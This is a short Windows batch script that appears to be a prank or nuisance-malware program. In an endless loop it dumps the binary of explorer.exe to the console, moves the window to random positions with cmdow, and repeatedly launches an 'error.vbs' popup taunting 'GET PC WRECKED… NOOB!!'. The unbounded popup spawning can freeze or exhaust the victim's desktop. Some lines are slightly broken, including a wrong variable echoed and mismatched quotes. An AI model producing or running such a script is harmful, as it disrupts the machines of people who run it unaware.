@echo off
:reen 
type "%windir%\explorer.exe" 
set /A rnd=%RANDOM% * 720 / 32768 + 1
echo %rnd%
set /A rnd3=%RANDOM% * 2 / 32768 + 1
echo %rnd3%
set /A rnd2=%RANDOM% * 720 / 32768 + 1
echo %rnd%
timeout /t %rnd3% /nobreak
cmdow @ /mov %rnd2% %rnd%
start "" error.vbs "GET PC WRECKED!!1!!!!! "NOOB!!"
goto reen